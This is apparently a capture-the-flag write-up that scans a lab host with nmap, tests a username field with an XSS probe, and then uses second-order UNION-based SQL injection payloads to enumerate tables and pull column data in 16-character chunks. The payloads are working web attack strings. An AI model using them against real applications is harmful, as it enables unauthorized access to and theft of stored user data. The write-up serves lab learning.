nmap -sV -sC -A -v 10.82.131.155

username payload: <script>alert(1)</script>

We create a user with the following payload and find the following error after logging in.

We migh have SQL Injection (second order) via the username. Second-order SQL injection involves injecting malicious SQL code that is stored in the database. The attack executes later when the application processes this stored data in another operation.
First of all, we check how many columns our current table has. We can guess two from the table with user id and timestamp, but we check anyway.

```
/" UNION SELECT 1 -- -
```

```
/" UNION SELECT 1,2 -- -
```
So we have two columns, we now enumerate the database using union SQL injection with the help pf the`INFORMATION_SCHEMA` database. We have the table `users`and `logins` present in the current database.
```
/" UNION SELECT 1, table_name FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=DATABASE() -- 
```
Next, we try to dump the users table. However, we realize that the output is limited to 16 characters.

```
/" UNION SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_schema = database() and table_name ='users'-- -
```
We use `SUBSTRING` to retrieve the 16 character blocks step by step from the initial output.
```
/" UNION SELECT 1,SUBSTRING((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = database() and table_name ='users'), 1, 16)-- -
```